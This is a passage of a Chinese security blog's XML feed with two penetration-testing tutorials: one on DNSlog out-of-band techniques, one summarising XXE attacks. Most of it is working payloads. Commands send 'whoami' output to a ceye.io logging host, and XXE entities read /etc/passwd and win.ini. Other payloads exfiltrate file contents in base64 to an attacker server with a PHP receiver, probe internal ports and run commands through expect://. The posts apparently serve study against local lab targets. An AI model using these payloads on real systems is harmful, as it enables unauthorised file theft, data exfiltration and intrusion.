title="利用场景"></a>利用场景</h3><p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p><h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><p><code>&lt;img src=http://xss.xxxx.ceye.io/aaa&gt;</code>：让<code>src</code>请求自己的<code>dnslog</code>平台<br><img src="https://qiniu.hzktester.top/tp2020112007.png" alt="tp2020112007.png"></p><h2 id="利用三：命令执行无回显"><a href="#利用三：命令执行无回显" class="headerlink" title="利用三：命令执行无回显"></a>利用三：命令执行无回显</h2><h3 id="利用场景-2"><a href="#利用场景-2" class="headerlink" title="利用场景"></a>利用场景</h3><p>针对不回显的命令注入漏洞，我们很难确定漏洞的存在并进一步利用，针对这种情况，我们可以利用<code>DNSLOG</code>来获取命令的执行结果。</p><h3 id="linux："><a href="#linux：" class="headerlink" title="linux："></a>linux：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://haha.xxx.ceye.io/`whoami`</span><br><span class="line">ping `whoami`.haha.xxx.ceye.io</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112008.png" alt="tp2020112008.png"><br><img src="https://qiniu.hzktester.top/tp2020112009.png" alt="image.png"></p><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping %USERNAME%.xxx.ceye.io</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020112010.png" alt="tp2020112010.png"><br><img src="https://qiniu.hzktester.top/tp2020112011.png" alt="image.png"><br>这里的<code>%username%</code>为用户变量</p><h2 id="利用四：SSRF"><a href="#利用四：SSRF" class="headerlink" title="利用四：SSRF"></a>利用四：SSRF</h2><p>这个没什么好说的，直接上<code>payload</code>，我们直接将<code>ssrf</code>中地址换成我们的<code>dnslog</code>平台<br>比如原本我们利用的是<code>url=127.0.0.1:8080</code><br>利用<code>dnslog</code>就换成 <code>url=xxx.cece.io</code><br>然后看我们的<code>dnslog</code>平台是否有服务器的<code>IP</code>来判断。</p><h2 id="利用五：XXE"><a href="#利用五：XXE" class="headerlink" title="利用五：XXE"></a>利用五：XXE</h2><h3 id="利用场景：-1"><a href="#利用场景：-1" class="headerlink" title="利用场景："></a>利用场景：</h3><p>当我们遇到<code>XXE</code>，如果这个<code>XXE</code>漏洞可以解析外部实体，那么不用说，就可以拿来读取本地服务器文件，这时，我们只需把文件改成这样：</p><h3 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip.port.xxxx.ceye.io/xxe_test&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;DNSlog回显原理&quot;&gt;&lt;a href=&quot;#DNSlog回显原理&quot; class=&quot;headerlink&quot; title=&quot;DNSlog回显原理&quot;&gt;&lt;/a&gt;DNSlog回显原理&lt;/h1&gt;&lt;p&gt;首先需要有一个可以配置的域名，比如：&lt;code&gt;ceye.io&lt;/code&gt;，然后通过代理商设置域名 &lt;code&gt;ceye.io&lt;/code&gt; 的 &lt;code&gt;nameserver&lt;/code&gt; 为自己的服务器 A，然后再服务器 A 上配置好 &lt;code&gt;DNS Server&lt;/code&gt;，这样以来所有 &lt;code&gt;ceye.io&lt;/code&gt; 及其子域名的查询都会到服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下。&lt;br&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112001.png&quot; alt=&quot;tp2020112001.png&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;DNS在解析的时候会留下日志，这个就是读取多级域名的解析日志，来获取信息&lt;br&gt;简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;利用场景&quot;&gt;&lt;a href=&quot;#利用场景&quot; class=&quot;headerlink&quot; title=&quot;利用场景&quot;&gt;&lt;/a&gt;利用场景&lt;/h1&gt;&lt;p&gt;在&lt;code&gt;sql&lt;/code&gt;注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被&lt;code&gt;waf&lt;/code&gt;拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，这时候就要用到我们的&lt;code&gt;DNSlog&lt;/code&gt;注入。&lt;/p&gt;
&lt;h1 id=&quot;推荐平台&quot;&gt;&lt;a href=&quot;#推荐平台&quot; class=&quot;headerlink&quot; title=&quot;推荐平台&quot;&gt;&lt;/a&gt;推荐平台&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.dnslog.cn/&quot;&gt;http://www.dnslog.cn&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://admin.dnslog.link/&quot;&gt;http://admin.dnslog.link&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://ceye.io/&quot;&gt;http://ceye.io&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以下利用，我这里使用&lt;code&gt;ceye&lt;/code&gt;平台演示。&lt;br&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112002.png&quot; alt=&quot;image.png&quot;&gt;&lt;br&gt;他会给你一个三级域名，你把信息写在第四级域名上就好了，比如我这里访问hzktester.xxxx.cece.io ，访问之后就会有查询记录。&lt;br&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112003.png&quot; alt=&quot;tp2020112003.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020112004.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;利用一：SQL注入&quot;&gt;&lt;a href=&quot;#利用一：SQL注入&quot; class=&quot;headerlink&quot; title=&quot;利用一：SQL注入&quot;&gt;&lt;/a&gt;利用一：SQL注入&lt;/h2&gt;&lt;h3 id=&quot;利用场景：&quot;&gt;&lt;a href=&quot;#利用场景：&quot; class=&quot;headerlink&quot; title=&quot;利用场景：&quot;&gt;&lt;/a&gt;利用场景：&lt;/h3&gt;</summary>
    
    
    
    <category term="Web渗透" scheme="https://hzktester.top/categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="DNSlog" scheme="https://hzktester.top/tags/DNSlog/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞总结</title>
    <link href="https://hzktester.top/posts/1a711be2.html"/>
    <id>https://hzktester.top/posts/1a711be2.html</id>
    <published>2020-11-19T04:00:00.000Z</published>
    <updated>2020-11-20T02:33:58.163Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE危害说明"><a href="#XXE危害说明" class="headerlink" title="XXE危害说明"></a>XXE危害说明</h1><p><code>XXE</code>就是<code>XML</code>外部实体注入。</p><p>由于服务端未对提交的<code>xml</code>的数据中引入外部实体做必要的处理，而在外部实体中引入<code>php</code>伪协议从而造成的攻击。</p><p>当允许引用外部实体时，通过构造恶意内容，可导致</p><ul><li>读取任意文件</li><li>探测内网端口</li><li>攻击内网网站</li><li>执行系统命令</li></ul><h1 id="漏洞环境说明"><a href="#漏洞环境说明" class="headerlink" title="漏洞环境说明"></a>漏洞环境说明</h1><h2 id="PHP环境低于5-5使用此代码测试"><a href="#PHP环境低于5-5使用此代码测试" class="headerlink" title="PHP环境低于5.5使用此代码测试"></a>PHP环境低于5.5使用此代码测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$data</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$xml</span> = simplexml_load_string(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不需要回显时 注释print($xml);</span></span><br><span class="line"><span class="built_in">print</span>(<span class="variable">$xml</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="PHP环境大于等于5-5使用此代码测试"><a href="#PHP环境大于等于5-5使用此代码测试" class="headerlink" title="PHP环境大于等于5.5使用此代码测试"></a>PHP环境大于等于5.5使用此代码测试</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$data</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$xml</span> = simplexml_load_string(<span class="variable">$data</span>, <span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不需要回显时 注释print($xml);</span></span><br><span class="line"><span class="built_in">print</span>(<span class="variable">$xml</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>注意点: 利用<code>xxe</code>读取的数据返回不能有<code>html</code>元素不然会报错</p><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>利用各种协议可以读取文件，比如<code>file://</code>，<code>php://filter</code></p><h4 id="windwos读取文件"><a href="#windwos读取文件" class="headerlink" title="windwos读取文件"></a>windwos读取文件</h4><p>使用<code>file://</code>协议：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span> &gt;]&gt;        </span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111901.png" alt="tp2020111901.png"><br>使用<code>php://filter</code>协议：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=C:/Windows/win.ini&quot;</span>&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111902.png" alt="tp2020111902.png"></p><h4 id="linux读取文件"><a href="#linux读取文件" class="headerlink" title="linux读取文件"></a>linux读取文件</h4><p>使用<code>file://</code>协议：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span>        </span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure><p>使用<code>php://filter</code>协议：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY  <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>无回显的的话则需要将文件读取的内容发送到我们的远程服务器上。</p><p>模拟场景：</p><table><thead><tr><th>服务器</th><th>域名</th><th>说明</th></tr></thead><tbody><tr><td>攻击机</td><td><a href="http://test.hzktester.top/XXE/">http://test.hzktester.top/XXE/</a></td><td>远程服务器</td></tr><tr><td>受害机</td><td><a href="http://192.168.3.13/XXE/">http://192.168.3.13/XXE/</a></td><td>本地搭建</td></tr></tbody></table><ol><li><p>在攻击机建立<code>php</code>文件接收数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 文件名称：get.php</span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag"><span class="attr">file_put_contents</span>(&#x27;<span class="attr">xxe_data.txt</span>&#x27;, $<span class="attr">_GET</span>[&#x27;<span class="attr">xxe_local</span>&#x27;]);</span></span><br><span class="line"><span class="tag">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在攻击机建立<code>xml</code>文件给用于给受害机引入 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 文件名称：1.xml</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=C:/Windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">param1</span> <span class="meta-string">&quot;&lt;!ENTITY exfil SYSTEM &#x27;http://test.hzktester.top/XXE/get.php?xxe_local=%data;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在受害机上执行<code>payload</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">sp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://test.hzktester.top/XXE/1.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;exfil;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111903.png" alt="tp2020111903.png"></p></li><li><p>执行完以后会把数据<code>base64</code>回传给<code>get.php</code>  。<code>get.php</code>会创建一个<code>xxe_data.txt</code>文件并且写入数据</p></li></ol><p><img src="https://qiniu.hzktester.top/tp2020111904.png" alt="image.png"></p><h2 id="探测内网"><a href="#探测内网" class="headerlink" title="探测内网"></a>探测内网</h2><p>修改<a href="http://127.0.0.1/"><code>http://127.0.0.1:80</code></a> 为任意地址端口</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:80&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行以后<br>如果访问的端口是打开的,那么他返回就会很快<br>如果返回很慢,就说明端口没开<br><img src="https://qiniu.hzktester.top/tp2020111905.png" alt="image.png"><br>这里页面显示报错了，使用返回的数据是<code>html</code></p><h2 id="攻击内网网站"><a href="#攻击内网网站" class="headerlink" title="攻击内网网站"></a>攻击内网网站</h2><p>例如：<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a>现在有<code>sql</code>注入<br>为了解决返回有<code>html</code>会爆错的问题,我们可以把数据<code>base64</code>发送到我们服务器进行查看</p><table><thead><tr><th>服务器</th><th>域名</th><th>说明</th></tr></thead><tbody><tr><td>攻击机</td><td><a href="http://test.hzktester.top/XXE/">http://test.hzktester.top/XXE/</a></td><td>远程服务器</td></tr><tr><td>受害机</td><td><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a></td><td>本地搭建</td></tr></tbody></table><ol><li><p>在攻击机建立<code>php</code>文件接收数据 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 文件名称：get.php</span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag"><span class="attr">file_put_contents</span>(&#x27;<span class="attr">xxe_data.txt</span>&#x27;, $<span class="attr">_GET</span>[&#x27;<span class="attr">xxe_local</span>&#x27;]);</span></span><br><span class="line"><span class="tag">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在攻击机建立<code>xml</code>文件用于给受害机引入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 文件名称：2.xml</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=http://127.0.0.1:80/sqli-labs/Less-1/?id=1&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">param1</span> <span class="meta-string">&quot;&lt;!ENTITY exfil SYSTEM &#x27;http://test.hzktester.top/XXE/get.php?xxe_local=%data;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>对<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1:80/sqli-labs/Less-1/?id=1</a>进行普通注入即可<br>例如：<br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1:80/sqli-labs/Less-1/?id=1</a><a href="http://127.0.0.1/test/test_sql.php?id=1%27">‘</a> and ‘1’=’1<br><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1:80/sqli-labs/Less-1/?id=1</a><a href="http://127.0.0.1/test/test_sql.php?id=1%27">‘</a> and ‘1’=’2</p></blockquote></li><li><p>受害机运行<code>payload</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">sp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://test.hzktester.top/XXE/2.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;exfil;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111906.png" alt="tp2020111906.png"></p></li><li><p>执行完以后会把数据<code>base64</code>回传给<code>get.php</code>  。<code>get.php</code>会创建一个<code>xxe_data.txt</code>文件并且写入数据</p></li></ol><p><img src="https://qiniu.hzktester.top/tp2020111907.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020111908.png" alt="image.png"><br>解密返回的就是页面数据 然后不断修改<code>2.xml</code>进行注入即可</p><h2 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h2><p>需要系统安装了<code>PECL</code>上的<code>Expect</code>拓展</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;expect://ipconfig&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="感谢师傅的笔记："><a href="#感谢师傅的笔记：" class="headerlink" title="感谢师傅的笔记："></a>感谢师傅的笔记：</h2><p>都是抄他的！<br><a href="https://www.yuque.com/pmiaowu/web_security_1/vgbyxt">https://www.yuque.com/pmiaowu/web_security_1/vgbyxt</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;XXE危害说明&quot;&gt;&lt;a href=&quot;#XXE危害说明&quot; class=&quot;headerlink&quot; title=&quot;XXE危害说明&quot;&gt;&lt;/a&gt;XXE危害说明&lt;/h1&gt;&lt;p&gt;&lt;code&gt;XXE&lt;/code&gt;就是&lt;code&gt;XML&lt;/code&gt;外部实体注入。&lt;/p&gt;
&lt;p&gt;由于服务端未对提交的&lt;code&gt;xml&lt;/code&gt;的数据中引入外部实体做必要的处理，而在外部实体中引入&lt;code&gt;php&lt;/code&gt;伪协议从而造成的攻击。&lt;/p&gt;
&lt;p&gt;当允许引用外部实体时，通过构造恶意内容，可导致&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;读取任意文件&lt;/li&gt;
&lt;li&gt;探测内网端口&lt;/li&gt;
&lt;li&gt;攻击内网网站&lt;/li&gt;
&lt;li&gt;执行系统命令&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;漏洞环境说明&quot;&gt;&lt;a href=&quot;#漏洞环境说明&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境说明&quot;&gt;&lt;/a&gt;漏洞环境说明&lt;/h1&gt;&lt;h2 id=&quot;PHP环境低于5-5使用此代码测试&quot;&gt;&lt;a href=&quot;#PHP环境低于5-5使用此代码测试&quot; class=&quot;headerlink&quot; title=&quot;PHP环境低于5.5使用此代码测试&quot;&gt;&lt;/a&gt;PHP环境低于5.5使用此代码测试&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$data&lt;/span&gt; = file_get_contents(&lt;span class=&quot;string&quot;&gt;&amp;#x27;php://input&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$xml&lt;/span&gt; = simplexml_load_string(&lt;span class=&quot;variable&quot;&gt;$data&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 不需要回显时 注释print($xml);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$xml&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;PHP环境大于等于5-5使用此代码测试&quot;&gt;&lt;a href=&quot;#PHP环境大于等于5-5使用此代码测试&quot; class=&quot;headerlink&quot; title=&quot;PHP环境大于等于5.5使用此代码测试&quot;&gt;&lt;/a&gt;PHP环境大于等于5.5使用此代码测试&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$data&lt;/span&gt; = file_get_contents(&lt;span class=&quot;string&quot;&gt;&amp;#x27;php://input&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span 